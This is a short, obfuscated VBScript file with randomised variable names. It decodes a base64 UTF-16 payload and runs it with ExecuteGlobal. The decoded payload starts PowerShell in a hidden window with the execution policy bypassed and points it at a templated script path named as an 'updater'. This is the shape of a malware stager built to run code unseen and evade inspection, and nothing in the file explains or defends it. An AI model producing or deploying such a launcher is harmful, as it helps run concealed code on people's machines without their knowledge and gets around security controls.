Dim ehtupkdl
ehtupkdl = ""
ehtupkdl = ehtupkdl & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEMAbQBk"
ehtupkdl = ehtupkdl & "AAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMA"
ehtupkdl = ehtupkdl & "cgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAu"
ehtupkdl = ehtupkdl & "AGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAA"
ehtupkdl = ehtupkdl & "LQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABv"
ehtupkdl = ehtupkdl & "AGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAEQAQQBUAEUAUgBfAFAA"
ehtupkdl = ehtupkdl & "UwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAs"
ehtupkdl = ehtupkdl & "ACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwAIAA9ACAATgBvAHQAaABpAG4AZwA="
Dim fmulmnnr
Set fmulmnnr = CreateObject("ADODB.Stream")
fmulmnnr.Type = 1
fmulmnnr.Open
Dim _xn : Set _xn = CreateObject("MSXml2.DOMDocument").createElement("z")
_xn.dataType = "bin.base64"
_xn.text = ehtupkdl
fmulmnnr.Write _xn.nodeTypedValue
fmulmnnr.Position = 0
fmulmnnr.Type = 2
fmulmnnr.Charset = "UTF-16LE"
Dim mbnbeqkz : mbnbeqkz = fmulmnnr.ReadText
fmulmnnr.Close
ExecuteGlobal mbnbeqkz